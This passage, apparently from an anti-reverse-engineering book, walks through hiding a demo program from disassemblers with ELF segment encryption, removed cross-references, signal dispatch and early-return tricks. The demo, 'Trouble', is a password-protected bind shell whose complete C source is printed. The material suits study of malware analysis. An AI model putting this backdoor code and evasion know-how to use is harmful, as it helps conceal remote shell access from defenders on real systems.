input.length());\noutputFile.close();\n\n**return EXIT_SUCCESS;**\n}\n\n##### You’ll need to add the project to the top level CMakeLists.txt in dontpanic.\n\n###### chap_4_static_analysis/dontpanic/CMakeList.txt\n\nproject(dontpanic C)\ncmake_minimum_required(VERSION 3.0)\n\nadd_subdirectory(encryptFunctions)\nadd_subdirectory(cryptor)\nadd_subdirectory(trouble)\n\n##### Finally, you’ll need to update Trouble’s CMakeList.txt to execute cryptor after compilation.\n\n###### Trouble’s CMakeList.txt with Cryptor\n\nproject(trouble C)\ncmake_minimum_required(VERSION 3.0)\n\n# This will create a 32 byte \"password\" for the bind shell. This command\n# is only run when \"cmake\" is run, so if you want to generate a new password\n# then \"cmake ..; make\" should be run from the command line.\nexec_program(\"/bin/sh\"\n\n${CMAKE_CURRENT_SOURCE_DIR}\nARGS \"-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'\"\nOUTPUT_VARIABLE random_password )\n\n# Pass the random password into ${PROJECT_NAME} as a macro\nadd_definitions(-Dpassword=\"${random_password}\" -Dpassword_size=33)\n\nset(CMAKE_C_COMPILER musl-gcc)\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 168\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -O3 -static -std=gnu11\")\nadd_executable(${PROJECT_NAME} src/trouble.c src/rc4.c)\n\nadd_custom_target(addLDS\n\nCOMMAND sed -i -e 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.\\\nlds -o,g' ./CMakeFiles/trouble.dir/link.txt)\n\nadd_dependencies(${PROJECT_NAME} addLDS)\n\n# After the build is successful, display the random password to the user\nadd_custom_command(TARGET ${PROJECT_NAME} POST_BUILD\n\nCOMMAND ${CMAKE_COMMAND} -E echo\n\"The bind shell password is:\" ${random_password})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINAR\\\nY_DIR}/${PROJECT_NAME})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../cryptor/cryptor ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_N\\\nAME})\n\n##### Cryptor is quite simple. It appends some assembly to the first LOAD segment and edits the entry point to point into this appended assembly. The appended assembly will execute the xor deobfuscation over the LOAD segment and then jump to the actual entry point. That’s it.\n\n#### Analyzing the Cryptor\n\n##### After recompiling Trouble look at the entry point and the program headers.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 169\n\n Trouble’s ELF header after Cryptor has been applied\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ readelf -\\\nh ./trouble/trouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x403154\nStart of program headers: 64 (bytes into file)\nStart of section headers: 22752 (bytes into file)\nFlags: 0x0\nSize of this header: 64 (bytes)\nSize of program headers: 56 (bytes)\nNumber of program headers: 4\nSize of section headers: 64 (bytes)\nNumber of section headers: 17\nSection header string table index: 14\n\n###### Trouble’s program headers after Cryptor has been appliedlang=sh\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ readelf -\\\nl ./trouble/trouble\n\nElf file type is EXEC (Executable file)\nEntry point 0x403154\nThere are 4 program headers, starting at offset 64\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nLOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000\n0x0000000000003154 0x0000000000003154 RWE 200000\nLOAD 0x0000000000003fe8 0x0000000000603fe8 0x0000000000603fe8\n0x00000000000001f8 0x0000000000000538 RW 200000\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 170\n\nGNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000\n0x0000000000000000 0x0000000000000000 RW 10\nGNU_RELRO 0x0000000000003fe8 0x0000000000603fe8 0x0000000000603fe8\n0x0000000000000018 0x0000000000000018 R 1\n\nSection to Segment mapping:\nSegment Sections...\n\n00 .init .text .check_password .fini .rodata .eh_frame\n01 .init_array .fini_array .jcr .data .rc4_check_password .bss\n02\n03 .init_array .fini_array .jcr\n\n##### Notice how the entry point starts at the very end of the first load segment? This char- acteristic of Cryptor has nothing to do with the actual encryption and decryption, but it’s interesting to note because disassembler’s have difficulty handling it. Check out how Radare2 fails.\n\n###### Radare2 unable to find Trouble’s entry point\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ radare2 .\\\n/trouble/trouble\nWarning: Cannot initialize dynamic strings\nWarning: read (init_offset)\n\n-- In soviet russia, radare2 debugs you!\n\n[0x00403154]> aaa\n\n[Cannot find function 'entry0' at 0x00403154 entry0 (aa)\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[Warning: Searching xrefs in non-executable regiones (aar)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[Oops invalid rangen calls (aac)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00403154]> pdf\np: Cannot find function at 0x00403154\n\n[0x00403154]>\n\n##### Why is Radare2 having trouble with this? Cryptor is taking advantage of the fact that when the first LOAD segment is loaded into memory that it will be page aligned. That means there is unused space at the end of the LOAD segment that gets mapped.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 171\n\n##### Cryptor inserts the decryption stub into this space. However, since Radare2 doesn’t expect anything beyond the program header it “can’t” find the entry point (aka the decryption stub).\n\n Similarly, IDA pops up two different warning dialogs.\n\n###### “First Warning”\n\n “Second Warning”\n\n##### IDA does attempt to disassemble some of the binary but it doesn’t go well because all of the code has been obfuscated by Cryptor.\n\n###### “IDA Navigation Bar After Using Cryptor”\n\n##### Also, like Radare2, IDA doesn’t contain the decryption stub in the dissassembly. Is there any way for a reverse engineer to disassemble the entry point? Yes! GDB to the rescue!\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 172\n\n Disassembling the Stub with GDB\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ gdb ./tro\\\nuble/trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble/trouble...(no debugging symbols found)...done.\n(gdb) disas 0x403154,0x403182\nDump of assembler code from 0x403154 to 0x403182:\n0x0000000000403154: Cannot access memory at address 0x403154\n(gdb) start\nTemporary breakpoint 1 at 0x400130\nStarting program: /home/albino-lobster/antire_book/chap_4_static_analysis/dontpanic/b\\\nuild/trouble/trouble\n^C\nProgram received signal SIGINT, Interrupt.\n0x0000000000401da0 in __syscall ()\n(gdb) disas 0x403154,0x403182\nDump of assembler code from 0x403154 to 0x403182:\n0x0000000000403154: mov $0x400120,%rbp\n0x000000000040315b: mov $0x403154,%r9\n0x0000000000403162: mov $0xaa,%r8\n0x0000000000403169: xor %r8,0x0(%rbp)\n0x000000000040316d: mov 0x0(%rbp),%r8\n0x0000000000403171: inc %rbp\n0x0000000000403174: cmp %r9,%rbp\n0x0000000000403177: jl 0x403162\n0x0000000000403179: mov $0x4003b0,%rbp\n0x0000000000403180: jmpq *%rbp\nEnd of assembler dump.\n(gdb)\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 173\n\n##### At first GDB didn’t want to disassemble the stub. However, once Trouble has been started there it has no problem disassembling the function.\n\n\n-----\n\n# Chapter 5: Obstructing Code Flow Analysis\n\n##### Eventually, a reverse engineer will break down all the little file format hacks and obfuscation that protects your binary and expose the disassembly for reverse engineering. However, there are a number of ways that you can write your code to make a reverse engineer’s job more difficult.\n\n### Indirect Function Calls\n\n##### Function cross references in tools like Radare2 and IDA are invaluable to a reverse engineer. The cross references show a various functions are connected and provide much needed context. Consider the cross reference IDA shows for check_password().\n\n###### check_password() cross reference\n\n.text:0000000000400740 public check_password\n.text:0000000000400740 check_password proc near ; CODE XREF: main+13\n.text:0000000000400740\n.text:0000000000400740 var_38 = xmmword ptr -38h\n.text:0000000000400740 var_28 = xmmword ptr -28h\n.text:0000000000400740 var_18 = byte ptr -18h\n.text:0000000000400740 var_10 = qword ptr -10h\n.text:0000000000400740\n\n##### If you follow the code reference you’ll find yourself in the main function. The call to check_password() is quite clear.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 175\n\n Call to check_password() from main()\n\n.text:0000000000400268 lea rdi, [rsp+78h+var_48]\n.text:000000000040026D call check_password\n\n##### Let’s try to hide this direct call using a function pointer. Below the check_password() function I added this declaration:\n\n**bool (*indirect_call)(const char*) = check_password;**\n\n##### This is a function pointer to check_password(). Next I updated the call to check_- password() in main() to use the function pointer.\n\n###### Call to check_password() using a function pointer\n\n**if ((*indirect_call)(password_input))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n##### Now let’s recompile Trouble and see what IDA says about the cross references to check_password() now.\n\n###### Code and data cross references to check_password()\n\n.text:0000000000400410 public check_password\n.text:0000000000400410 check_password proc near ; CODE XREF: main+13\n.text:0000000000400410 ; DATA XREF: .data:indirect_call\n.text:0000000000400410\n.text:0000000000400410 var_38 = xmmword ptr -38h\n.text:0000000000400410 var_28 = xmmword ptr -28h\n.text:0000000000400410 var_18 = byte ptr -18h\n.text:0000000000400410 var_10 = qword ptr -10h\n.text:0000000000400410\n\n##### Hmm… that is not an improvement. By using a function pointer, I caused a data cross reference and a code cross reference to be created! Let’s look at the call to check_password() in main().\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 176\n\n Calling check_password() via a function pointer\n\n.text:0000000000400268 lea rdi, [rsp+78h+var_48]\n.text:000000000040026D call cs:indirect_call\n\n##### The code breaks down to the indirect function call that I wanted to make. How does IDA know the call is to check_password()? If you double click the cs:indirect_call link in IDA then you jump to this:\n\n###### Definition of indirect_call in .data\n\n.data:0000000000603008 public indirect_call\n.data:0000000000603008 indirect_call dq offset check_password ; DATA XREF: main+13\n\n##### Well, that will do it. IDA must be looking at the value stored in indirect_call and using that value to determine where the call is going. Let’s try initializing the function pointer with NULL instead of check_password().\n\n**bool (*indirect_call)(const char*) = NULL;**\n\n##### Next update main() to store check_password() in indirect_call.\n\n###### Update Trouble’s main() to store check_password() in indirect_call\n\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\nindirect_call = check_password;\n\n##### After recompiling let’s check out what IDA has to say.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 177\n\n check_password() with only a date reference\n\n.text:0000000000400410 public check_password\n.text:0000000000400410 check_password proc near ; DATA XREF: main+15\n.text:0000000000400410\n.text:0000000000400410 var_38 = xmmword ptr -38h\n.text:0000000000400410 var_28 = xmmword ptr -28h\n.text:0000000000400410 var_18 = byte ptr -18h\n.text:0000000000400410 var_10 = qword ptr -10h\n.text:0000000000400410\n\n##### That’s an improvement! The code reference is no longer there and the data reference is up towards the top of main().\n\n###### The data cross reference to check_password()\n\n.text:0000000000400145 mov cs:indirect_call, offset check_password\n.text:0000000000400150 mov rax, fs:28h\n.text:0000000000400159 mov [rsp+78h+var_20], rax\n.text:000000000040015E xor eax, eax\n.text:0000000000400160 call socket\n\n##### The call to check_password() looks the same as it did before the change to initialize indirect_call with NULL.\n\n###### Indirect call to check_password()\n\n.text:0000000000400270 lea rdi, [rsp+78h+var_48]\n.text:0000000000400275 call cs:indirect_call\n\n##### However, indirect_call different. It has moved from .data to .bss and has no default value.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 178\n\n indirect_call after initializing with NULL\n\n.bss:0000000000603188 public indirect_call\n.bss:0000000000603188 indirect_call dq ? ; DATA XREF: main+15\n.bss:0000000000603188 ; main+145\n\n##### Pretty good. But maybe you can remove the data cross reference to check_password() by messing with the address stored in indirect_call. Let’s change the assignment at the top of main() a little.\n\n###### Storing the wrong address in indirect_call\n\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\nindirect_call = check_password - 0x100;\n\n##### We then have to adjust the function poiner before making the call to check_pass- word().\n\n###### Adjusting the address in indirect_call()\n\nindirect_call = indirect_call + 0x100;\n**if ((*indirect_call)(password_input))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n##### If you recompile Trouble and drop it into IDA you should see this.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 179\n\n No more cross references to check_password()\n\n.text:0000000000400430 public check_password\n.text:0000000000400430 check_password proc near\n.text:0000000000400430\n.text:0000000000400430 var_38 = xmmword ptr -38h\n.text:0000000000400430 var_28 = xmmword ptr -28h\n.text:0000000000400430 var_18 = byte ptr -18h\n.text:0000000000400430 var_10 = qword ptr -10h\n.text:0000000000400430\n\n##### Nice. No cross references! In just four lines of code you were able to remove all cross references to check_password().\n\n### Signals\n\n##### Another code flow obfuscation technique is to use signals⁴⁶. A signal is an IPC mechanism that can be used to alter the execution flow of a program. If you’ve ever used a terminal you’re almost certainly familiar with signals. For example, when you hit “Ctrl-C” to terminate a program you’ve actually sent the SIGINT signal. There are many signals and you can find them all by looking at the signal man page⁴⁷.\n\n Using the function sigaction⁴⁸ you can register a function to handle a specific signal. For example, if you register a function to handle SIGINT and you hit “Ctrl-C” while program is running then your function will be called instead of terminating the program. That’s pretty useful, right? You can also send signals to your program using the kill⁴⁹ function. How is that useful? Instead of directly calling a function, you can register the function with sigaction() and generate a signal with kill() everytime you want to call the function.\n\n For example, consider this version of the Trouble bind shell.\n\n###### ⁴⁶https://en.wikipedia.org/wiki/Unix_signal ⁴⁷man 7 signal ⁴⁸man sigaction ⁴⁹man 2 kill\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 180\n\n Calling spawn_shell() via a SIGUSR1 signal\n\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <signal.h>\n#include <string.h>\n#include <stdbool.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\n#include \"xor_string.h\"\n\n**bool check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n**void spawn_shell()**\n{\n\n**char* empty[] = { NULL };**\n**char binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };**\nexecve(binsh, empty, empty);\n}\n\n/**\n\n - This implements a fairly simple bind shell. The server first requires a\n\n - password before allowing access to the shell. The password is currently\n\n - randomly generated each time 'cmake ..' is run. The server has no shutdown\n\n - mechanism so it will run until killed.\n*/\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**struct sigaction sVal;**\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 181\n\nsVal.sa_flags = SA_SIGINFO;\nsVal.sa_sigaction = spawn_shell;\nsigaction(SIGUSR1, &sVal, NULL);\n\n**int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);**\n**if (sock == -1)**\n{\nfprintf(stderr, \"Failed to create the socket.\");\n**return EXIT_FAILURE;**\n}\n\n**struct sockaddr_in bind_addr = {};**\nbind_addr.sin_family = AF_INET;\nbind_addr.sin_addr.s_addr = htonl(INADDR_ANY);\nbind_addr.sin_port = htons(1270);\n\n**int bind_result = bind(sock, (struct sockaddr*) &bind_addr,**\n\n**sizeof(bind_addr));**\n**if (bind_result != 0)**\n{\nperror(\"Bind call failed\");\n**return EXIT_FAILURE;**\n}\n\n**int listen_result = listen(sock, 5);**\n**if (listen_result != 0)**\n{\nperror(\"Listen call failed\");\n**return EXIT_FAILURE;**\n}\n\n**while (true)**\n{\n\n**int client_sock = accept(sock, NULL, NULL);**\n**if (client_sock < 0)**\n{\nperror(\"Accept call failed\");\n**return EXIT_FAILURE;**\n}\n\n**int child_pid = fork();**\n**if (child_pid == 0)**\n{\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 182\n\n// read in the password\n**char password_input[password_size] = { 0 };**\n**int read_result = read(client_sock, password_input, password_size - 1);**\n**if (read_result < (int)(password_size - 1))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n**if (check_password(password_input))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\ndup2(client_sock, 0);\ndup2(client_sock, 1);\ndup2(client_sock, 2);\nkill(getpid(), SIGUSR1);\n\nclose(client_sock);\n**return EXIT_SUCCESS;**\n}\n\nclose(client_sock);\n}\n}\n\n##### In the above, I introduced a new function called spawn_shell() that contains the logic for executing “/bin/sh”. Notice how it’s never directly called though? Instead of directly calling spawn_shell() this line triggers its execution:\n\nkill(getpid(), SIGUSR1);\n\n##### The spawn_shell() function is executed when Trouble receives the SIGUSR1 signal.\n\n This makes static analysis harder because it forces the reverse engineer to track down all of the sigaction() calls to figure out what function gets called for each signal. Otherwise, all the reverse engineer just sees this:\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 183\n\n Call to spawn_shell() via kill()\n\n.text:00000000004002A4 call check_password\n.text:00000000004002A9 test al, al\n.text:00000000004002AB jnz short loc_4002ED\n.text:00000000004002AD xor esi, esi\n.text:00000000004002AF mov edi, ebx\n.text:00000000004002B1 call dup2\n.text:00000000004002B6 mov esi, 1\n.text:00000000004002BB mov edi, ebx\n.text:00000000004002BD call dup2\n.text:00000000004002C2 mov esi, 2\n.text:00000000004002C7 mov edi, ebx\n.text:00000000004002C9 call dup2\n.text:00000000004002CE call getpid\n.text:00000000004002D3 mov esi, 0Ah\n.text:00000000004002D8 mov edi, eax\n.text:00000000004002DA call kill\n.text:00000000004002DF mov edi, ebx\n.text:00000000004002E1 call close\n.text:00000000004002E6 xor eax, eax\n\n### Early Return\n\n##### Another way to hide Trouble’s logic is to trick the dissasembler into exiting the check_password() function early. One way to do this is to push an address onto the stack and immeaditely return. This will cause the program to return to the address on the stack. There is actually a very good write up on this technique on malwintor.com⁵⁰ but we’ll create our own example as well.\n\n In order to use the early return technique, you’ll create a label in check_password() and use inline assembly to push the address of the label onto the stack. The updated check_password() looks like this:\n\n###### ⁵⁰https://www.malwinator.com/2015/11/27/anti-disassembly-techniques-used-by-malware-a-primer-part-2/\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 184\n\n Returning to the middle of check_password()\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n:\n: \"g\"(&&return_here));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### There are two interesting things here: 1. I’ve introduced the optimize attribute into the function declaration. This will keep the optimization level for this function at “O1”. I’ve done this because higher levels of optimization seem to move the label location and generally break the program. 2. I’ve used a GCC extension to get the address of the “return_here:” label. Using “&&” in front of a label will get the address of the lable.\n\n If you disassemble this code you will quickly see that nothing is obfuscated.\n\n###### Obfuscation fail\n\n.text:0000000000400740 push rbx\n.text:0000000000400741 sub rsp, 30h\n.text:0000000000400745 mov rbx, rdi\n.text:0000000000400748 mov rax, fs:28h\n.text:0000000000400751 mov [rsp+38h+var_10], rax\n.text:0000000000400756 xor eax, eax\n.text:0000000000400758 mov byte ptr [rsp+38h+var_18], 0\n.text:000000000040075D push offset loc_400763\n.text:0000000000400762 retn\n.text:0000000000400763 ; --------------------------------------------.text:0000000000400763\n.text:0000000000400763 loc_400763: ; CODE XREF: check_password+22\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 185\n\n.text:0000000000400763 ; DATA XREF: check_password+1D\n.text:0000000000400763 mov [rsp+38h+var_19], 0D2h\n.text:0000000000400768 mov [rsp+38h+var_1A], 9Ah\n\n##### As you saw in a previous section, IDA followed the address that check_password() pushed onto the stack. You need to obfuscate or calculate the address of the label in some way that will prevent the disassembler from following the logic. Try this:\n\n###### Obfuscating the return address\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\n**char* label_address = calc_addr(((char*)&&return_here) - 0x400000);**\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### You can see that all I’ve done is substracted and added 0x400000 from the label address. However, the disassembly is much more to my liking.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 186\n\n Early return in check_password() hides code\n\nalbino-lobster@ubuntu:~/antire_book/chap_5_code_flow/dontpanic/build$ radare2 ./troub\\\nle/trouble\nWarning: Cannot initialize dynamic strings\n-- Wow, my cat knows radare2 hotkeys better than me!\n\n[0x0040030c]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x0040030c]> pdf @ sym.check_password\n/ (fcn) sym.check_password 43\n| sym.check_password ();\n| ; var int local_20h @ rsp+0x20\n| ; var int local_28h @ rsp+0x28\n| ; CALL XREF from 0x0040026d (unk)\n| 0x00400750 53 push rbx\n| 0x00400751 4883ec30 sub rsp, 0x30 ; '0'\n| 0x00400755 4889fb mov rbx, rdi\n| 0x00400758 64488b042528. mov rax, qword fs:[0x28] ; [0x28:8]=0x4\\\n740 ; '('\n| 0x00400761 4889442428 mov qword [rsp + local_28h], rax\n| 0x00400766 31c0 xor eax, eax\n| 0x00400768 c644242000 mov byte [rsp + local_20h], 0\n| 0x0040076d 48c7c77b0700. mov rdi, 0x77b\n| 0x00400774 e8c7ffffff call sym.calc_addr\n| 0x00400779 50 push rax\n**\\** 0x0040077a c3 ret\n\n[0x0040030c]>\n\n##### Very cool, huh? Before you get too excited though there is still a problem. In graph view, IDA looks similar to Radare2. However, in text view you can see that IDA continues to disassemble the code you are trying to hide.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 187\n\n IDA continues disassembly beyond check_password()\n\n.text:0000000000400750 public check_password\n.text:0000000000400750 check_password proc near ; CODE XREF: main+13D\n.text:0000000000400750\n.text:0000000000400750 var_18 = byte ptr -18h\n.text:0000000000400750 var_10 = qword ptr -10h\n.text:0000000000400750\n.text:0000000000400750 push rbx\n.text:0000000000400751 sub rsp, 30h\n.text:0000000000400755 mov rbx, rdi\n.text:0000000000400758 mov rax, fs:28h\n.text:0000000000400761 mov [rsp+38h+var_10], rax\n.text:0000000000400766 xor eax, eax\n.text:0000000000400768 mov [rsp+38h+var_18], 0\n.text:000000000040076D mov rdi, 77Bh\n.text:0000000000400774 call calc_addr\n.text:0000000000400779 push rax\n.text:000000000040077A retn\n.text:000000000040077A check_password endp ; sp-analysis failed\n.text:000000000040077A\n.text:000000000040077B ; -----------------------------------------------.text:000000000040077B mov byte ptr [rsp+1Fh], 0D2h\n.text:0000000000400780 mov byte ptr [rsp+1Eh], 9Ah\n\n##### Notice how IDA continues to disassemble at 0x40077B? It marks this code as having no cross references, but continues to disassemble it. IDA must just keep trying to disassemble code after it has completed a function. However, maybe if you insert some non-code then IDA will stop disassembling? To insert some data use the “.string” directive.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 188\n\n Inserting non-code to stop IDA’s diassembly\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\n**char* label_address = calc_addr(((char*)&&return_here) - 0x400000);**\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n\".string \\\"\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\\"\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### Now if you look at the disassembly, you’ll see that IDA doesn’t disassemble the majority of check_password().\n\n###### Finally breaking analysis of check_password()\n\n.text:0000000000400750 public check_password\n.text:0000000000400750 check_password proc near ; CODE XREF: main+13D\n.text:0000000000400750\n.text:0000000000400750 var_18 = byte ptr -18h\n.text:0000000000400750 var_10 = qword ptr -10h\n.text:0000000000400750\n.text:0000000000400750 push rbx\n.text:0000000000400751 sub rsp, 30h\n.text:0000000000400755 mov rbx, rdi\n.text:0000000000400758 mov rax, fs:28h\n.text:0000000000400761 mov [rsp+38h+var_10], rax\n.text:0000000000400766 xor eax, eax\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 189\n\n.text:0000000000400768 mov [rsp+38h+var_18], 0\n.text:000000000040076D mov rdi, 787h\n.text:0000000000400774 call calc_addr\n.text:0000000000400779 push rax\n.text:000000000040077A retn\n.text:000000000040077A check_password endp ; sp-analysis failed\n.text:000000000040077A\n.text:000000000040077A ; -----------------------------------------------------------.text:000000000040077B db 72h, 73h, 74h, 75h, 76h\n.text:0000000000400780 dq 0C6007F7E7A797877h, 1E2444C6D21F2444h, 44C6E61D2444C69Ah\n.text:0000000000400780 dq 0E21B2444C69D1C24h, 2444C6CD1A2444C6h, 0C6ED182444C6E619h\n.text:0000000000400780 dq 162444C6D0172444h, 44C6C6152444C6C1h, 92132444C6C51424h\n.text:0000000000400780 dq 2444C6C4122444C6h, 0C6C7102444C6FC11h, 0E2444C6E30F2444h\n.text:0000000000400780 dq 44C6920D2444C6C9h, 0C40B2444C69E0C24h, 2444C6E60A2444C6h\n.text:0000000000400780 dq 0C6EE082444C69D09h, 62444C6F2072444h, 44C6F3052444C69Bh\n.text:0000000000400780 dq 0F2032444C6C00424h, 2444C6FD022444C6h, 0AABAE02404C6C501h\n.text:0000000000400780 dq 20BEFFFFFFh, 0FFFFFBD8E8E78948h, 0DE894800000020BAh\n.text:0000000000400780 dq 688E8C78948h, 4C8B48C0950FC085h, 28250C3348642824h\n.text:0000000000400780 dq 202E80B74000000h, 441F0F660000h\n.text:0000000000400868 ; -----------------------------------------------------------.text:0000000000400868 add rsp, 30h\n.text:000000000040086C pop rbx\n.text:000000000040086D retn\n\n### Jump Over an Invalid Byte\n\n##### In the last section you were able to stop IDA and Radare2 from disassembling the majority of check_password(). However, a quick glance at the code makes it pretty obvious that the value “0x787” is being passed to calc_addr() and that you’re using “retn” to jump to the address returned by calc_addr(). One way to hide this information is a technique described by Silvio Cesare in an article titled “Linux Anti- Debugging Techniques (Fooling the Debugger)”⁵¹ all the way back in 1999.\n\n First, let’s see how check_password() looks in GDB.\n\n###### ⁵¹http://vxheaven.org/lib/vsc04.html\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 190\n\nalbino-lobster@ubuntu:~/antire_book/chap_5_code_flow/dontpanic/build$ gdb ./trouble/t\\\nrouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble/trouble...(no debugging symbols found)...done.\n(gdb) disas 0x400750,0x40077b\nDump of assembler code from 0x400750 to 0x40077b:\n0x0000000000400750 <check_password+0>: push %rbx\n0x0000000000400751 <check_password+1>: sub $0x30,%rsp\n0x0000000000400755 <check_password+5>: mov %rdi,%rbx\n0x0000000000400758 <check_password+8>: mov %fs:0x28,%rax\n0x0000000000400761 <check_password+17>: mov %rax,0x28(%rsp)\n0x0000000000400766 <check_password+22>: xor %eax,%eax\n0x0000000000400768 <check_password+24>: movb $0x0,0x20(%rsp)\n0x000000000040076d <check_password+29>: mov $0x787,%rdi\n0x0000000000400774 <check_password+36>: callq 0x400740 <calc_addr>\n0x0000000000400779 <check_password+41>: push %rax\n0x000000000040077a <check_password+42>: retq\nEnd of assembler dump.\n(gdb)\n\n##### GDB disassembles linearly. Knowing this you can hide the “mov $0x787, %rdi” instruction by introducing 